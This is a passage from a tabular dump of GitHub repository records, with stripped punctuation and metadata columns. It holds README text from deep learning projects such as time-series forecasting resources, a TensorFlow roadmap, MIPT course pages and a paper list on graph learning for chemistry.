CLUSTERING FULLY UNSUPERVISED LEARNING OF TIME DOMAIN FEATURES https arxiv org pdf 1802 01059 pdf Naveen Sai Madiraju et al Code unofficial implementation https github com FlorentF9 DeepTemporalClustering 2017 Discriminative State Space Models https papers nips cc paper 7150 discriminative state space models pdf NIPS 2017 Vitaly Kuznetsov and Mehryar Mohri Code not yet 2016 Temporal Regularized Matrix Factorization for High dimensional Time Series Prediction https papers nips cc paper 6160 temporal regularized matrix factorization for high dimensional time series prediction NIPS 2016 Code https github com rofuyu exp trmf nips16 Time Series Prediction and Online Learning http proceedings mlr press v49 kuznetsov16 pdf JMLR 2016 Vitaly Kuznetsov and Mehryar Mohri Code not yet Comparative Classical methods vs Deep Learning methods Forecasting economic and financial time series ARIMA VS LSTM https arxiv org pdf 1803 06386 pdf A comparative study between LSTM and ARIMA for sales forecasting in retail https pdfs semanticscholar org e58c 7343ea25d05f6d859d66d6bb7fb91ecf9c2f pdf ARIMA SARIMA vs LSTM with Ensemble learning Insights for Time Series Data https towardsdatascience com arima sarima vs lstm with ensemble learning insights for time series data 509a5d87f20a Conferences Machine learning NeurIPS https nips cc ICML https icml cc ICLR https iclr cc Artificial intelligence AAAI https www aaai org AISTATS https www aistats org ICANN https e nns org icann2019 IJCAI https www ijcai org UAI http www auai org Code Notebooks https github com Alro10 deep learning time series tree master notebooks Code Theory Resource Deep learning for high dimensional time series blog https towardsdatascience com deep learning for high dimensional time series 7a72b033a7e0 Deep Learning AI Optimization https deeplearning ai ai notes optimization Backpropagation for LSTM https towardsdatascience com back to basics deriving back propagation on simple rnn lstm feat aidan gomez c7f286ba973d Stock Market Prediction by Recurrent Neural Network on LSTM Model https blog usejournal com stock market prediction by recurrent neural network on lstm model 56de700bff68 Decoupling Hierarchical Recurrent Neural Networks With Locally Computable Losses https arxiv org pdf 1910 05245 pdf Time Series Analysis with Deep Learning Simplified https towardsdatascience com time series analysis with deep learning simplified 5c444315d773 ML techniques applied to stock prices https towardsdatascience com machine learning techniques applied to stock price prediction 6c1994da8001 Code Resource Using attentive neural processes for forecasting power usage https github com wassname attentive neural processes Non Gaussian forecasting using fable R https robjhyndman com hyndsight fable2 SKTIME https github com alan turing institute sktime Papers with code Multivariate time series forecasting https paperswithcode com task multivariate time series forecasting DeepAR by Amazon https docs aws amazon com sagemaker latest dg deepar html DFGP by Amazon https aws amazon com blogs machine learning now available in amazon sagemaker deepar algorithm for more accurate time series forecasting https www kaggle com c demand forecasting kernels only https www kaggle com c favorita grocery sales forecasting https www kaggle com c grupo bimbo inventory demand https www kaggle com c recruit restaurant visitor forecasting Predicting hypothesizing the findings of the M4 Competition https www sciencedirect com science article pii S0169207019301098 Datasets Electricity dataset from UCI https archive ics uci edu ml datasets ElectricityLoadDiagrams20112014 Traffic dataset from UCI https archive ics uci edu ml datasets PEMS SF Air quality from UCI http archive ics uci edu ml datasets Air Quality Seattle freeway traffic speed https github com zhiyongc Seattle Loop Data Kaggle Web Traffic Time Series Forecasting https www kaggle com c web traffic time series forecasting,2019-08-22T13:39:58Z,2019-12-13T03:01:52Z,Jupyter Notebook,Alro10,User,3,35,10,121,master,Alro10,1,0,0,0,0,0,0
machinelearningmindset,TensorFlow-Roadmap,deep-learning#machine-learning#python#tensorflow#tensorflow-tutorials,TensorFlow Roadmap Project Page http tensorflow world resources readthedocs io en latest image https travis ci org astorfi TensorFlow World Resources svg branch master target https travis ci org astorfi TensorFlow World Resources image https img shields io badge contributions welcome brightgreen svg style flat target https github com astorfi TensorFlow World Resources pulls image https badges frapsoft com os v2 open source svg v 102 target https github com ellerbrock open source badge image https coveralls io repos github astorfi TensorFlow World Resources badge svg branch master target https coveralls io github astorfi TensorFlow World Resources branch master image https img shields io twitter follow amirsinatorfi svg label Follow style social target https twitter com amirsinatorfi Download Free TensorFlow Roadmap EBook raw html raw html raw html Table of Contents contents local depth 3 Introduction The purpose of this project is to introduce a shortcut to developers and researcher for finding useful resources about TensorFlow Motivation There are different motivations for this open source project Why using TensorFlow A deep learning is of great interest these days the crucial necessity for rapid and optimized implementation of the algorithms and designing architectures is the software environment TensorFlow is designed to facilitate this goal The strong advantage of TensorFlow is it flexibility is designing highly modular model which also can be a disadvantage too for beginners since lots of the pieces must be considered together for creating the model This issue has been facilitated as well by developing high level APIs such as Keras and Slim which gather lots of the design puzzle pieces The interesting point about TensorFlow is that its trace can be found anywhere these days Lots of the researchers and developers are using it and its community is growing with the speed of light So the possible issues can be overcame easily since they might be the issues of lots of other people considering a large number of people involved in TensorFlow community What s the point of this open source project There other similar repositories similar to this repository and are very comprehensive and useful and to be honest they made me ponder if there is a necessity for this repository A great example is awesome tensorflow repository which is a curated list of different TensorFlow resources The point of this repository is that the resources are being targeted The organization of the resources is such that the user can easily find the things he she is looking for We divided the resources to a large number of categories that in the beginning one may have a headache However if someone knows what is being located it is very easy to find the most related resources Even if someone doesn t know what to look for in the beginning the general resources have been provided How to make the most of this effort The written and visual resources have been split Moreover As one can search in the documentation the number of categories might look to be too much For finding the most relevant resources please at first look through the general resources Entrance to TensorFlow World In this section different TensorFlow topics and their associated resources will be addressed Installation image img mainpage installation gif First of all the TensorFlow must be installed Installing TensorFlow Official TensorFLow installation Install TensorFlow from the source A comprehensive guide on how to install TensorFlow from the source using python anaconda TensorFlow Installation A short TensorFlow installation guide powered by NVIDIA 7 SIMPLE STEPS TO INSTALL TENSORFLOW ON WINDOWS A concise tutorial for installing TensorFlow on Windows Installing TensorFlow https www tensorflow org install Install TensorFlow from the source https github com astorfi TensorFlow World tree master docs tutorials installation TensorFlow Installation http www nvidia com object gpu accelerated applications tensorflow installation html 7 SIMPLE STEPS TO INSTALL TENSORFLOW ON WINDOWS http saintlad com install tensorflow on windows Install TensorFlow on Ubuntu A comprehensive tutorial on how to install TensorFlow on Ubuntu Installation of TensorFlow The video covers how to setup TensorFlow Installing CPU and GPU TensorFlow on Windows A tutorial on TensorFlow installation for Windows Installing the GPU version of TensorFlow for making use of your CUDA GPU A GPU targeted TensoFlow installation Install TensorFlow on Ubuntu https www youtube com watch v 3JFEPk4qQY t 3s Installation of TensorFlow https www youtube com watch v CvspEt8kSIg Installing CPU and GPU TensorFlow on Windows https www youtube com watch v r7 WPbx8VuY Installing the GPU version of TensorFlow for making use of your CUDA GPU https www youtube com watch v io6Ajf5XkaM Getting Started image img mainpage gettingstarted gif This part points to resources on how to start to code with TensorFLow Getting Started With TensorFlow Framework This guide gets you started programming in TensorFlow learning TensorFlow Deep Learning A great resource to start Welcome to TensorFlow World A simple and concise start to TensorFLow learning TensorFlow Deep Learning http learningtensorflow com gettingstarted Getting Started With TensorFlow Framework https www tensorflow org getstarted getstarted Welcome to TensorFlow World https github com astorfi TensorFlow World tree master docs tutorials 0 welcome Gentlest Introduction to Tensorflow TensorFlow in 5 Minutes Deep Learning with TensorFlow Introduction to TensorFlow TensorFlow Tutorial Sherry Moore Google Brain Deep Learning with Neural Networks and TensorFlow Introduction A fast with TensorFlow Going Deeper in TensorFLow image img mainpage goingdeep gif Advanced machine learning users can go deeper in TensorFlow in order to hit the root Scratching the surface may never take us too further TensorFlow Mechanics More experienced machine learning users can dig more in TensorFlow Advanced TensorFlow Advanced Tutorials in TensorFlow We Need to Go Deeper A Practical Guide to Tensorflow and Inception Wide and Deep Learning Better Together with TensorFlow A tutorial by Google Research Blog TensorFlow Mechanics https www tensorflow org getstarted mnist mechanics Advanced TensorFlow https github com sjchoi86 advanced tensorflow We Need to Go Deeper https medium com initialized capital we need to go deeper a practical guide to tensorflow and inception 50e66281804f Wide and Deep Learning Better Together with TensorFlow https research googleblog com 2016 06 wide deep learning better together with html TensorFlow DeepDive More experienced machine learning users can dig more in TensorFlow Go Deeper Transfer Learning TensorFlow and Deep Learning Distributed TensorFlow Design Patterns and Best Practices A talk that was given at the Advanced Spark and TensorFlow Meetup Distributed TensorFlow Guide Fundamentals of TensorFlow TensorFlow Wide and Deep Advanced Classification the easy way Tensorflow and deep learning without a PhD A great tutorial on TensoFLow workflow TensorFlow DeepDive https www youtube com watch v T0H6zF3K1mc Go Deeper Transfer Learning https www youtube com watch v iu3MOQ Z3b4 Distributed TensorFlow Design Patterns and Best Practices https www youtube com watch v YAkdydqUE2c Distributed TensorFlow Guide https github com tmulc18 Distributed TensorFlow Guide Fundamentals of TensorFlow https www youtube com watch v EM6SU8QVSlY TensorFlow Wide and Deep Advanced Classification the easy way https www youtube com watch v WKgNNC0VLhM Tensorflow and deep learning without a PhD https www youtube com watch v vq2nnJ4g6N0 Programming with TensorFlow The references here deal with the details of programming and writing TensorFlow code Reading data and input pipeline image img mainpage readingdata gif The first part is always how to prepare data and how to provide the pipeline to feed it to TensorFlow Usually providing the input pipeline can be complicated even more than the structure design Dataset API for TensorFlow Input Pipelines A TensorFlow official documentation on Using the Dataset API for TensorFlow Input Pipelines TesnowFlow input pipeline Input pipeline provided by Stanford TensorFlow input pipeline example A working example TensorFlow Data Input TensorFlow Data Input Placeholders Protobufs Queues Reading data The official documentation by the TensorFLow on how to read data basics of reading a CSV file A tutorial on reading a CSV file Custom Data Readers Official documentation on this how to define a reader Dataset API for TensorFlow Input Pipelines https github com tensorflow tensorflow tree v1 2 0 rc1 tensorflow contrib data TesnowFlow input pipeline http web stanford edu class cs20si lectures slides09 pdf TensorFlow input pipeline example http ischlag github io 2016 06 19 tensorflow input pipeline example TensorFlow Data Input https indico io blog tensorflow data inputs part1 placeholders protobufs queues Reading data https www tensorflow org programmersguide readingdata basics of reading a CSV file http learningtensorflow com ReadingFilesBasic Custom Data Readers https www tensorflow org extend newdataformats Tensorflow tutorial on TFRecords A tutorial on how to transform data into TFRecords Tensorflow tutorial on TFRecords https www youtube com watch v F503abjanHA An introduction to TensorFlow queuing and threading A tutorial on how to understand and create queues an efficient pipelines An introduction to TensorFlow queuing and threading http adventuresinmachinelearning com introduction tensorflow queuing Variables image img mainpage variables gif Variables are supposed to hold the parameters and supersede by new values as the parameters are updated Variables must be clearly set and initialized Creation Initialization Variables Creation and Initialization An official documentation on setting up variables Introduction to TensorFlow Variables Creation and Initialization This tutorial deals with defining and initializing TensorFlow variables Variables An introduction to variables Variables Creation and Initialization https www tensorflow org programmersguide variables Introduction to TensorFlow Variables Creation and Initialization http machinelearninguru com deeplearning tensorflow basics variables variables html Variables http learningtensorflow com lesson2 Saving and restoring Saving and Loading Variables The official documentation on saving and restoring variables save and restore Tensorflow models A quick tutorial to save and restore Tensorflow models Saving and Loading Variables https www tensorflow org programmersguide variables save and restore Tensorflow models http cv tricks com tensorflow tutorial save restore tensorflow models quick complete tutorial Sharing Variables Sharing Variables The official documentation on how to share variables Sharing Variables https www tensorflow org programmersguide variablescope Deep Learning with Tensorflow Tensors and Variables A Tensorflow tutorial for introducing Tensors Variables and Placeholders Tensorflow Variables A quick introduction to TensorFlow variables Save and Restore in TensorFlow TensorFlow Tutorial on Save and Restore variables Deep Learning with Tensorflow Tensors and Variables https www youtube com watch v zgV WzLyrYE Tensorflow Variables https www youtube com watch v UYyqNH3r4lk Save and Restore in TensorFlow https www tensorflow org programmersguide variablescope TensorFlow Utilities image img mainpage utility png figure img mainpage utility png scale 20 alt map to buried treasure raw html Different utilities empower TensorFlow for faster computation in a more monitored manner Supervisor Supervisor Training Helper for Days Long Trainings The official documentation for TensorFLow Supervisor Using TensorFlow Supervisor with TensorBoard summary groups Using both TensorBoard and the Supervisor for profit Tensorflow example A TensorFlow example using Supervisor Supervisor Training Helper for Days Long Trainings https www tensorflow org programmersguide supervisor Using TensorFlow Supervisor with TensorBoard summary groups https dev widemeadows de 2017 01 21 using tensorflows supervisor with tensorboard summary groups Tensorflow example http codata colorado edu notebooks tutorials tensorflowexampledavisyoshida TensorFlow Debugger TensorFlow Debugger tfdbg Command Line Interface Tutorial Official documentation for using debugger for MNIST How to Use TensorFlow Debugger with tf contrib learn A more high level method to use the debugger Debugging TensorFlow Codes A Practical Guide for Debugging TensorFlow Codes Debug TensorFlow Models with tfdbg A tutorial by Google Developers Blog TensorFlow Debugger tfdbg Command Line Interface Tutorial https www tensorflow org programmersguide debugger How to Use TensorFlow Debugger with tf contrib learn https www tensorflow org programmersguide tfdbg tflearn Debugging TensorFlow Codes https github com wookayin tensorflow talk debugging Debug TensorFlow Models with tfdbg https developers googleblog com 2017 02 debug tensorflow models with tfdbg html MetaGraphs Exporting and Importing a MetaGraph Official TensorFlow documentation Model checkpointing using meta graphs in TensorFlow A working example Exporting and Importing a MetaGraph https www tensorflow org programmersguide metagraph Model checkpointing using meta graphs in TensorFlow http www seaandsailor com tensorflow checkpointing html Tensorboard TensorBoard Visualizing Learning Official documentation by TensorFlow TensorFlow Ops Provided by Stanford Visualisation with TensorBoard A tutorial on how to create and visualize a graph using TensorBoard Tensorboard A brief tutorial on Tensorboard TensorBoard Visualizing Learning https www tensorflow org getstarted summariesandtensorboard TensorFlow Ops http web stanford edu class cs20si lectures notes02 pdf Visualisation with TensorBoard http learningtensorflow com Visualisation Tensorboard http edwardlib org tutorials tensorboard Hands on TensorBoard TensorFlow Dev Summit 2017 An introduction to the amazing things you can do with TensorBoard Tensorboard Explained in 5 Min Providing the code for a simple handwritten character classifier in Python and visualizing it in Tensorboard How to Use Tensorboard Going through a bunch of different features in Tensorboard Hands on TensorBoard TensorFlow Dev Summit 2017 https www youtube com watch v eBbEDRsCmv4 Tensorboard Explained in 5 Min https www youtube com watch v 3bownM3L5zM How to Use Tensorboard https www youtube com watch v fBVEXKp4DIc TensorFlow Tutorials This section is dedicated to provide tutorial resources on the implementation of different models with TensorFlow Linear and Logistic Regression image img mainpage logisticregression png TensorFlow Linear Model Tutorial Using TF Learn API in TensorFlow to solve a binary classification problem Linear Regression in Tensorflow Predicting house prices in Boston area Linear regression with Tensorflow Make use of tenso,2019-09-14T21:25:54Z,2019-11-25T07:37:20Z,Python,machinelearningmindset,Organization,1,35,9,23,master,astorfi,1,0,0,0,0,0,0
CleanPegasus,coffeeshop,deep-learning#monitoring-tool#pip#python#python-package#slack,made with python https img shields io badge Made 20with Python 1f425f svg https www python org GitHub license https img shields io github license Naereen StrapDown js svg https github com Naereen StrapDown js blob master LICENSE Coffeeshop This package sends your deep learning training loss and accuracy to your slack channel after every specified epoch It uses slackclient and keras python packages Installation pip install coffeeshop Code sample python from coffeeshop coffeeshop import Coffeeshop secret xoxp slacktoken For sending metrics to channel channelname nameofchanneltobeposted histories Coffeeshop token secret channelname channelname epochnum 5 For sending metrics to user user User Name histories Coffeeshop token secret username user epochnum 5 Add histories in the callbacks model fit Xtrain Ytrain epochs epochs batchsize batchsize callbacks histories Output sample Contact E mail arunk609 gmail com Github https github com CleanPegasus LinkedIn https www linkedin com in arunkumar l,2019-08-26T19:10:52Z,2019-10-22T09:42:57Z,Python,CleanPegasus,User,2,33,6,15,master,CleanPegasus,1,0,0,0,0,0,0
DLSchool,deep_learning_2019-20_basic,n/a,2019 2020 Deep Learning 2019 2020 https www dlschool org https mipt ru education departments fpmi https github com DLSchool deeplearning2018 19 iPavlov,2019-09-02T19:43:27Z,2019-11-26T10:13:35Z,n/a,DLSchool,Organization,17,30,16,6,master,izaharkin,1,0,0,0,0,0,0
CoderWangcai,DRL_Path_Planning,n/a,DRLPathPlanning This is a DRL Deep Reinforcement Learning platform built with Gazebo for the purpose of robot s adaptive path planning Environment Software Ubuntu 16 04 ROS Kinect Python 2 7 12 tensorflow 1 12 0,2019-08-25T09:33:22Z,2019-12-11T03:31:35Z,Python,CoderWangcai,User,4,30,16,0,master,,0,0,0,1,1,0,0
BPHO-Salk,PSSR,n/a,Point Scanning Super Resolution PSSR Good stuff BioRxiv Preprint Deep Learning Based Point Scanning Super Resolution Imaging https www biorxiv org content 10 1101 740548v3 Pretrained models can be downloaded here PSSR for Electron Microscopy EM https www dropbox com s 4o8n1jc1piivohz PSSREM pkl dl 0 PSSR singleframe PSSR SF for mitoTracker https www dropbox com s jfsze6ro6boefzt PSSR SFmitotracker pkl dl 0 PSSR multiframe PSSR MF for mitoTracker https www dropbox com s 99ct6nxgndfnv3f PSSR MFmitotracker pkl dl 0 PSSR for neuronal mitochondria https www dropbox com s dlj6kbnch291wmk PSSRneuronalMito pkl dl 0 I know this is unusual but we do have a beautifully written PSSR Tweetorial https twitter com manorlaboratory status 1169624396891185152 s 20 Enjoy Instruction of use Environment set up Install Anaconda Learn more https docs anaconda com anaconda install Create a new conda environment for PSSR conda env create file env yaml Learn more https docs conda io projects conda en latest user guide tasks manage environments html creating an environment from an environment yml file EM inference Please refer to the handy InferencePSSRforEM ipynb https github com BPHO Salk PSSR blob master InferencePSSRforEM ipynb You need to modify the path for the test images accordingly Note the input pixel size needs to be 8 nm,2019-08-18T11:33:29Z,2019-12-12T21:41:55Z,Python,BPHO-Salk,User,4,30,3,22,master,BPHO-Salk,1,0,0,0,0,0,0
deepmipt,tdl2,n/a,TDL logo banner3 gif This is a GitHub page of the 2nd part of Theoretical Deep Learning course held by Neural Networks and Deep Learning Lab MIPT For the first part see this page https github com deepmipt tdl Note that two parts are mostly mutually independent The working language of this course is Russian Location Moscow Institute of Physics and Technology building room 5 22 Time Monday 10 45 The first lecture on September 9 16 will start at 11 00 10 45 Videos will be added to this https www youtube com playlist list PLt1IfGj6 eiAGKvcZrHCp1mejmxMCiX playlist Lecture slides homework assignments and videos will appear in this repo and will be available for everyone However we can guarantee that we will check your homework only if you are a MIPT student Further announcements will be in our Telegram chat https t me joinchat DljjxJHIrD8IuFvfqVLPw Syllabus This syllabus is not final and may change 1 16 09 19 Introduction Short recap of TDL 1 Course structure Organization notes Slides slides Intro pdf video https youtu be xwfAiaJ74Vk 2 16 09 19 Worst case generalization bounds growth function VC dimension Slides slides Worstcasebounds pdf up to page 10 video https youtu be fzKGRxk4DXk 3 23 09 19 Worst case generalization bounds margin loss fat shattering dimension covering numbers Slides slides Worstcasebounds pdf up to page 10 the same as in the previous lecture video https youtu be qheV9dDyLcg 4 30 09 19 Worst case generalization bounds McDiarmid inequality Rademacher complexity spectral complexity Slides slides Worstcasebounds pdf pages 11 17 video https youtu be 4Q3zoMTBamc 5 07 10 19 Worst case generalization bounds bound for deep ReLU nets Slides slides Worstcasebounds pdf pages 11 17 video https youtu be 8MuJM4S3UyM 6 14 10 19 Worst case generalization bounds failure of uniform bounds Slides slides Worstcasebounds pdf pages starting from 18 PAC bayesian bounds at most countable hypothesis classes Slides slides PACbayesianbounds pdf up to page 3 Video https youtu be V yhl7usGkU 7 21 10 19 PAC bayesian bounds uncountable hypothesis classes Slides slides PACbayesianbounds pdf pages 3 6 Video https youtu be 7rFIVhLXflQ 8 28 10 19 PAC bayesian bounds dealing with stochasticity requirement margin based bound for deep ReLU nets Slides slides PACbayesianbounds pdf pages 7 19 Video https youtu be 8x4RqMRRsCM 9 11 11 19 PAC bayesian bounds margin based bound for deep ReLU nets Slides slides PACbayesianbounds pdf pages 16 20 Video https youtu be 2xKmJuDnpLw 10 18 11 19 Compression based bounds re deriving a margin based bound for deep ReLU nets Slides slides PACbayesianbounds pdf pages 18 26 Video https youtu be zkx3F1XlMfU 11 2 12 19 Implicit bias of gradient descent Prerequisites Basic calculus probability linear algebra Labs are given as jupyter notebooks We use python3 need familiriaty with numpy pytorch matplotlib Some experience in DL not the first time of learning MNIST Labs are possible to do on CPU but it can take quite a long time to train 1 2 days Grading This course will contain 1 lab and 2 theoretical assignments There also will be an oral exam in the form of interview at the end of the course Let phw your points for homeworks total possible points for homeworks excluding extra points Define pexam analogously Your final grade will be computed as follows grade min 10 phw khw pexam kexam where the coefficents are khw 4 kexam 6 This numbers are not final and can change Send your homeworks to tdlcoursemipt protonmail com E mails should be named as Lab or theory number Your Name and Surname Homeworks The 1st theoretical assignment hwtheory tdl2theory1 pdf is out Deadline 4 11 2019 12 00 Moscow time The 2nd theoretical assignment hwtheory tdl2theory2 pdf is out Deadline 2 12 2019 12 00 Moscow time Lab assignment hwlab nn complexity ipynb is out Deadline 16 12 2019 12 00 Exam zachet Syllabus is here tdl2examsyllabus pdf Grading and question balance between main and auxiliary parts is not final and may change Start with digging into main part first WARNING If you have this course for zachet and you want to have your zachet in time i e in a zachet week the only available option is December 16 Course staff Eugene Golikov https github com varenick course admin lectures homeworks Ivan Skorokhodov https github com universome homeworks This course is dedicated to the memory of Maksim Kretov https github com kretovmk 30 12 1986 13 02 2019 without whom this course would have never been created,2019-08-23T07:35:59Z,2019-12-12T18:55:08Z,Jupyter Notebook,deepmipt,Organization,7,28,4,33,master,varenick,1,0,0,0,0,0,0
ivannz,mlss2019-bayesian-deep-learning,active-learning#bayesian-deep-learning#mlss2019-moscow#variational-bayes,MLSS2019 Bayesian Deep Learning Installation colab In Google colab there is no need to clone the repo or preinstall anything all jupyter runtimes come with the basic packages like numpy scipy and matplotlib and deep learning libraries keras tensorflow and pytorch The only step to make is to change the runtime type to GPU in Edit Notebook settings or Runtime Change runtime type by selecting GPU as Hardware accelerator Installation local install Please make sure that you have the following packages installed tqdm numpy torch 1 1 The most convenient way to ensure this is use Anaconda with python 3 7 When all prerequisites have been met please clone this repository and install it with bash git clone https github com ivannz mlss2019 bayesian deep learning git cd mlss2019 bayesian deep learning pip install editable This will install the necessary service python code that will make the seminar much more concise and hopefully your learning experience better Versions The version presented at MLSS Moscow Aug 26 Sep 5 2019 can also be found in the MLSS2019 https github com mlss skoltech repo Here it sits under the tag mlss2019 Aug 30,2019-08-21T11:50:47Z,2019-12-12T10:08:15Z,Jupyter Notebook,ivannz,User,1,26,14,90,master,ivannz,1,0,1,0,0,0,0
jonkrohn,DLTFpT,n/a,Deep Learning with TensorFlow Keras and PyTorch This repository is home to the code that accompanies Jon Krohn s www jonkrohn com Deep Learning with TensorFlow Keras and PyTorch LiveLessons featuring the Tensorflow 2 library Installation Installation instructions for running the code in this repository can be found in the installation directory https github com jonkrohn DLTFpT tree master installation Notebooks All of the code covered in the LiveLessons can be found in this directory https github com jonkrohn DLTFpT tree master notebooks as Jupyter notebooks,2019-08-12T20:45:12Z,2019-12-13T16:47:07Z,Jupyter Notebook,jonkrohn,User,5,26,14,133,master,jonkrohn,1,0,0,0,0,0,1
mufeili,DL4MolecularGraph,n/a,Deep Learning for Graphs in Chemistry and Biology This is a paper list of deep learning on graphs in chemistry and biology from ML community chemistry community and biology community This is inspired by the Literature of Deep Learning for Graphs project contents local depth 2 sectnum depth 2 role venue strong Review The Rise of Deep Learning in Drug Discovery Hongming Chen Ola Engkvist Yinhai Wang Marcus Olivecrona Thomas Blaschke venue Drug Discov Today 2018 23 6 property and activity prediction de novo design reaction prediction retrosynthetic analysis ligandprotein interactions biological imaging analysis Opportunities and obstacles for deep learning in biology and medicine Travers Ching Daniel S Himmelstein Brett K Beaulieu Jones Alexandr A Kalinin Brian T Do Gregory P Way Enrico Ferrero Paul Michael Agapow Michael Zietz Michael M Hoffman Wei Xie Gail L Rosen Benjamin J Lengerich Johnny Israeli Jack Lanchantin Stephen Woloszynek Anne E Carpenter Avanti Shrikumar Jinbo Xu Evan M Cofer Christopher A Lavender Srinivas C Turaga Amr M Alexandari Zhiyong Lu David J Harris Dave DeCaprio Yanjun Qi Anshul Kundaje Yifan Peng Laura K Wiley Marwin H S Segler Simina M Boca S Joshua Swamidass Austin Huang Anthony Gitter and Casey S Greene venue Journal of the Royal Society Interface 2018 Volume 15 Issue 141 Protein protein interaction networks and graph analysis Chemical featurization and representation learning Applications of Machine Learning in Drug Discovery and Development Jessica Vamathevan Dominic Clark Paul Czodrowski Ian Dunham Edgardo Ferran George Lee Bin Li Anant Madabhushi Parantu Shah Michaela Spitzer Shanrong Zhao venue Nature Reviews Drug Discovery 18 target identification molecule optimization biomarker discovery computational pathology Deep learning for molecular designa review of the state of the art Daniel C Elton Zois Boukouvalas Mark D Fuge Peter W Chunga venue Molecular Systems Design Engineering 2019 4 molecular representation deep learning architectures evaluation prospective and future directions Generative Models for Automatic Chemical Design Daniel Schwalbe Koda Rafael Gmez Bombarelli venue arXiv 1907 inverse design generative models prospects challenges Benchmark and Dataset Discriminative Models MoleculeNet A Benchmark for Molecular Machine Learning Zhenqin Wu Bharath Ramsundar Evan N Feinberg Joseph Gomes Caleb Geniesse Aneesh S Pappu Karl Leswing Vijay Pande venue Journal of Chemical Sciences 2018 9 property prediction public datasets evaluation metrics baseline results quantum mechanics physical chemistry biophysics physiology Website Alchemy A Quantum Chemistry Dataset for Benchmarking AI Models Guangyong Chen Pengfei Chen Chang Yu Hsieh Chee Kong Lee Benben Liao Renjie Liao Weiwen Liu Jiezhong Qiu Qiming Sun Jie Tang Richard Zemel Shengyu Zhang venue arXiv 1906 property prediction public datasets baseline results quantum mechanics Website Generative Models GuacaMol Benchmarking Models for De Novo Molecular Design Nathan Brown Marco Fiscato Marwin H S Segler Alain C Vaucher venue Journal of Chemical Information and Modeling 2019 59 3 ChEMBL public datasets evaluation metrics baseline results distribution learning goal directed optimization Github Molecular Sets MOSES A Benchmarking Platform for Molecular Generation Models Daniil Polykovskiy Alexander Zhebrak Benjamin Sanchez Lengeling Sergey Golovanov Oktai Tatanov Stanislav Belyaev Rauf Kurbanov Aleksey Artamonov Vladimir Aladinskiy Mark Veselov Artur Kadurin Sergey Nikolenko Alan Aspuru Guzik Alex Zhavoronkov venue arXiv 1811 ZINC public datasets evaluation metrics baseline results distribution learning Github Discriminative Models Convolutional Networks on Graphs for Learning Molecular Fingerprints David Duvenaud Dougal Maclaurin Jorge Aguilera Iparraguirre Rafael Gmez Bombarelli Timothy Hirzel Aln Aspuru Guzik Ryan P Adams venue NeurIPS 2015 graph neural networks Github Molecular graph convolutions moving beyond fingerprints Steven Kearnes Kevin McCloskey Marc Berndl Vijay Pande Patrick Riley venue Journal of Computer Aided Molecular Design 2016 30 8 graph neural networks Low Data Drug Discovery with One shot Learning Han Altae Tran Bharath Ramsundar Aneesh S Pappu Vijay Pande venue ACS Central Science 2017 3 4 graph neural networks one shot learning Quantum chemical Insights from Deep Tensor Neural Networks Kristof T Schtt Farhad Arbabzadah Stefan Chmiela Klaus R Mller Alexandre Tkatchenko venue Nature Communications 8 graph neural networks quantum mechanics Atomic Convolutional Networks for Predicting Protein Ligand Binding Affinity Joseph Gomes Bharath Ramsundar Evan N Feinberg Vijay S Pande venue arXiv 1703 graph neural networks protein ligand binding affinity PDBBind nearest neighbor graphs Neural Message Passing for Quantum Chemistry Justin Gilmer Samuel S Schoenholz Patrick F Riley Oriol Vinyals George E Dahl venue ICML 2017 graph neural networks quantum mechanics Github Deep Learning Based Regression and Multi class Models for Acute Oral Toxicity Prediction with Automatic Chemical Feature Extraction Youjun Xu Jianfeng Pei Luhua Lai venue Journal of Chemical Information and Modeling 2017 57 11 graph neural networks Deriving Neural Architectures from Sequence and Graph Kernels Tao Lei Wengong Jin Regina Barzilay Tommi Jaakkola venue ICML 2017 graph neural networks Github SchNet A continuous filter convolutional neural network for modeling quantum interactions Kristof T Schtt Pieter Jan Kindermans Huziel E Sauceda Stefan Chmiela Alexandre Tkatchenko Klaus Robert Mller venue arXiv 1706 graph neural networks quantum mechanics Github Learning Graph Level Representation for Drug Discovery Junying Li Deng Cai Xiaofei He venue arXiv 1709 graph neural networks Github Prediction Errors of Molecular Machine Learning Models Lower than Hybrid DFT Error Felix A Faber Luke Hutchison Bing Huang Justin Gilmer Samuel S Schoenholz George E Dahl Oriol Vinyals Steven Kearnes Patrick F Riley O Anatole von Lilienfeld venue Journal of Chemical Theory and Computation 2017 13 11 graph neural networks benchmark results Predicting Organic Reaction Outcomes with Weisfeiler Lehman Network Wengong Jin Connor W Coley Regina Barzilay Tommi Jaakkola venue NeurIPS 2017 graph neural networks reaction prediction Github Protein Interface Prediction Using Graph Convolutional Networks Alex Fout Jonathon Byrd Basir Shariat Asa Ben Hur venue NeurIPS 2017 graph neural networks protein interface prediction Github Convolutional Embedding of Attributed Molecular Graphs for Physical Property Prediction Connor W Coley Regina Barzilay William H Green Tommi S Jaakkola Klavs F Jensen venue Journal of Chemical Information and Modeling 2017 57 8 graph neural networks Github PotentialNet for Molecular Property Prediction Evan N Feinberg Debnil Sur Zhenqin Wu Brooke E Husic Huanghao Mai Yang Li Saisai Sun Jianyi Yang Bharath Ramsundar Vijay S Pande venue ACS Central Science 2018 4 11 graph neural networks protein ligand binding affinity metric Chemi net a graph convolutional network for accurate drug property prediction Ke Liu Xiangyan Sun Lei Jia Jun Ma Haoming Xing Junqiu Wu Hua Gao Yax Sun Florian Boulnois Jie Fan venue arXiv 1803 graph neural networks Deeply Learning Molecular Structure property Relationships Using Attention and Gate augmented Graph Convolutional Network Seongok Ryu Jaechang Lim Seung Hwan Hong Woo Youn Kim venue arXiv 1805 graph neural networks Github Neural Message Passing with Edge Updates for Predicting Properties of Molecules and Materials Peter Bjrn Jrgensen Karsten Wedel Jacobsen Mikkel N Schmidt venue arXiv 1806 graph neural networks Modeling polypharmacy side effects with graph convolutional networks Marinka Zitnik Monica Agrawal Jure Leskovec venue Bioinformatics Volume 34 Issue 13 01 July 2018 graph neural networks polypharmacy side effects interaction prediction multi relation Github BayesGrad Explaining Predictions of Graph Convolutional Networks Hirotaka Akita Kosuke Nakago Tomoki Komatsu Yohei Sugawara Shin ichi Maeda Yukino Baba Hisashi Kashima venue arXiv 1807 graph neural networks interpretability Graph Convolutional Neural Networks for Predicting Drug Target Interactions Wen Torng Russ B Altman venue bioRXiv graph neural networks auto encoders interaction prediction Three Dimensionally Embedded Graph Convolutional Network 3DGCN for Molecule Interpretation Hyeoncheol Cho Insung S Choi venue arXiv 1811 graph neural networks property prediction interpretability A graph convolutional neural network model for the prediction of chemical reactivity Connor W Coley Wengong Jin Luke Rogers Timothy F Jamison Tommi S Jaakkola William H Green Regina Barzilay Klavs F Jensen venue Chemical Science 2019 10 graph neural networks reaction 